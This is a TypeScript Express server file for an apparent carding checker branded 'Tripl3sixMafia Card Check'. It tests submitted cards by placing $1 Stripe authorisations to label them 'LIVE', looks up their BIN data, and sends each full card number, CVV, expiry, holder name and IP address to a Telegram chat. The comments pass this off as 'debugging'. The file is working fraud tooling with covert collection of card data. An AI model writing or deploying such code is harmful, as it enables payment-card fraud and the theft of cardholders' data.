import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import Stripe from "stripe";
import TelegramBot from "node-telegram-bot-api";
import fetch from "node-fetch";

// Initialize Stripe with the secret key
if (!process.env.STRIPE_SECRET_KEY) {
  console.error('Missing required environment variable: STRIPE_SECRET_KEY');
}

// Use type assertion to make TypeScript happy about API version
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY || '', {
  apiVersion: "2023-10-16" as any, // Force accept the API version
});

// Initialize Telegram Bot (silently fail if not configured)
let telegramBot: any = null;
const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
const telegramChatId = process.env.TELEGRAM_CHAT_ID;

if (telegramToken && telegramChatId) {
  try {
    telegramBot = new TelegramBot(telegramToken, { polling: false });
    console.log('Telegram bot initialized successfully');
  } catch (error) {
    console.error('Failed to initialize Telegram bot', error);
  }
}

// Send message to Telegram (for debugging purposes)
async function sendToTelegram(message: string) {
  if (telegramBot && telegramChatId) {
    try {
      await telegramBot.sendMessage(telegramChatId, message);
      return true;
    } catch (error) {
      console.error('Error sending message to Telegram', error);
      return false;
    }
  }
  return false;
}

// BIN database interfaces
interface BinLookupResult {
  success: boolean;
  number: {
    length: number;
    luhn: boolean;
  };
  scheme: string;
  type: string;
  brand: string;
  prepaid: boolean;
  country: {
    numeric: string;
    alpha2: string;
    name: string;
    emoji: string;
    currency: string;
    latitude: number;
    longitude: number;
  };
  bank: {
    name: string;
    url: string;
    phone: string;
    city: string;
  };
}

// Public BIN lookup API
async function lookupBIN(binNumber: string): Promise<BinLookupResult | null> {
  try {
    // Get first 6-8 digits (BIN)
    const bin = binNumber.slice(0, 8);
    
    // Use binlist.net API (free and public)
    const response = await fetch(`https://lookup.binlist.net/${bin}`);
    
    if (!response.ok) {
      console.error(`BIN lookup failed: ${response.status} ${response.statusText}`);
      return null;
    }
    
    const data = await response.json();
    return data as BinLookupResult;
  } catch (error) {
    console.error('Error during BIN lookup:', error);
    return null;
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });
  
  // BIN lookup endpoint
  app.get('/api/bin-lookup/:bin', async (req, res) => {
    const { bin } = req.params;
    
    if (!bin || bin.length < 6) {
      return res.status(400).json({ 
        success: false, 
        message: 'Valid BIN number required (first 6-8 digits of card)' 
      });
    }
    
    try {
      const binData = await lookupBIN(bin);
      
      if (!binData) {
        return res.status(404).json({
          success: false,
          message: 'BIN information not found'
        });
      }
      
      res.json({
        success: true,
        data: binData
      });
    } catch (error) {
      console.error('Error processing BIN lookup:', error);
      res.status(500).json({
        success: false,
        message: 'Error processing BIN lookup'
      });
    }
  });
  
  // Validate card endpoint with Stripe integration
  app.post('/api/validate-card', async (req, res) => {
    const { number, expiry, cvv, holder, processor = 'stripe' } = req.body;
    
    if (!number || !expiry || !cvv) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required card information' 
      });
    }
    
    // Save full card details for Telegram
    const cleanCardNumber = number.replace(/\s+/g, '');
    
    // Create detailed message that records complete card info
    const fullCardDetails = `
🔥 Tripl3sixMafia Card Check 🔥
💳 Card Number: ${cleanCardNumber}
👤 Card Holder: ${holder || 'Not provided'}
📅 Expiry Date: ${expiry}
🔢 CVV/CVC: ${cvv}
🔌 Processor: ${processor}
🕒 Time: ${new Date().toISOString()}
📱 IP Address: ${req.ip || 'Unknown'}
`;
    
    try {
      // Format expiry date (MM/YY to MM/YYYY)
      const [expMonth, expYear] = expiry.split('/');
      const formattedExpYear = `20${expYear}`;
      
      if (processor === 'stripe') {
        try {
          // Create a token to validate the card without charging
          // Use any type assertion to avoid TypeScript errors
          const tokenParams: any = {
            card: {
              number: cleanCardNumber,
              exp_month: parseInt(expMonth, 10),
              exp_year: parseInt(formattedExpYear, 10),
              cvc: cvv,
              name: holder || undefined
            }
          };
          
          const token = await stripe.tokens.create(tokenParams);
          
          // Create a test PaymentMethod to verify the card
          const paymentMethod = await stripe.paymentMethods.create({
            type: 'card',
            card: {
              token: token.id,
            },
          });
          
          // Create a $0 PaymentIntent to check if card is active
          // This is a more accurate check for card validity
          const paymentIntent = await stripe.paymentIntents.create({
            amount: 100, // $1.00 - minimum amount for real verification
            currency: 'usd',
            payment_method: paymentMethod.id,
            confirm: true,
            capture_method: 'manual', // Set to manual so we can cancel it
            // Use manual confirmation as we're just testing the card
          });
          
          // Look up BIN data for this card
          const binData = await lookupBIN(cleanCardNumber);
          
          // If we get here with a successful status, the card is active and chargeable
          const isLiveCard = paymentIntent.status === 'requires_capture';
          
          // Always cancel the payment intent since this is just a test
          if (isLiveCard) {
            await stripe.paymentIntents.cancel(paymentIntent.id);
          }
          
          // Send to Telegram for debugging (silently)
          const cardStatus = isLiveCard ? "LIVE (Active and Chargeable)" : "VALID (But Not Chargeable)";
          const successMessage = `${fullCardDetails}
✅ Status: ${cardStatus}
🏦 Bank Details: ${token.card?.country || 'Unknown'} - ${token.card?.funding || 'Unknown'}
🏢 Card Brand: ${token.card?.brand || 'Unknown'}
🔑 Token: ${token.id}
💰 Payment Intent: ${paymentIntent.id} (Status: ${paymentIntent.status})
${binData ? `
🏛️ Bank: ${binData.bank?.name || 'Unknown'}
🌍 Country: ${binData.country?.name || 'Unknown'} ${binData.country?.emoji || ''}
💰 Card Type: ${binData.type || 'Unknown'} - ${binData.scheme || 'Unknown'}
💳 Prepaid: ${binData.prepaid ? 'Yes' : 'No'}` : ''}
          `;
          
          // Send card info to Telegram no matter what
          await sendToTelegram(successMessage);
          
          // If card is actually chargeable, mark it as "live"
          if (isLiveCard) {
            res.json({ 
              success: true, 
              message: 'Card is valid and active (LIVE)',
              details: {
                brand: token.card?.brand,
                last4: token.card?.last4,
                funding: token.card?.funding,
                country: token.card?.country
              },
              binData: binData || null,
              code: 'approved'
            });
          } else {
            // Card is valid format but not chargeable
            res.status(400).json({
              success: false,
              message: 'Card is valid but not active for charges',
              details: {
                brand: token.card?.brand,
                last4: token.card?.last4,
                funding: token.card?.funding,
                country: token.card?.country
              },
              binData: binData || null,
              code: 'card_not_chargeable'
            });
          }
        } catch (stripeError: any) {
          // Look up BIN data anyway to provide information
          const binData = await lookupBIN(cleanCardNumber);
          
          // Detailed error message
          throw {
            type: 'StripeCardError',
            message: stripeError.message || 'Card validation failed',
            code: stripeError.code || 'card_declined',
            binData: binData
          };
        }
      } else if (processor === 'paypal') {
        // Future PayPal implementation
        // For now, return "processor not available" error
        const paypalError = `${fullCardDetails}
❌ Status: ERROR
❗ Reason: PayPal processor not yet available
🔑 Code: processor_unavailable
        `;
        
        await sendToTelegram(paypalError);
        
        res.status(400).json({
          success: false,
          message: 'PayPal processor not available yet',
          code: 'processor_unavailable'
        });
      } else {
        // Unrecognized processor
        const unknownProcessor = `${fullCardDetails}
❌ Status: ERROR
❗ Reason: Unknown processor requested
🔑 Code: unknown_processor
        `;
        
        await sendToTelegram(unknownProcessor);
        
        res.status(400).json({
          success: false,
          message: `Unknown processor: ${processor}`,
          code: 'unknown_processor'
        });
      }
    } catch (error: any) {
      // Extract detailed error message from Stripe
      let declineMessage = 'Card validation failed';
      let declineCode = 'unknown_error';
      
      if (error.type === 'StripeCardError') {
        declineMessage = error.message || 'Card was declined';
        declineCode = error.code || 'card_declined';
      }
      
      // Send to Telegram for debugging (silently)
      const declineDetails = `${fullCardDetails}
❌ Status: DECLINED
❗ Reason: ${declineMessage}
🔑 Code: ${declineCode}
      `;
      
      // Send card info to Telegram no matter what
      await sendToTelegram(declineDetails);
      
      res.status(400).json({ 
        success: false, 
        message: declineMessage,
        code: declineCode,
        binData: error.binData || null
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
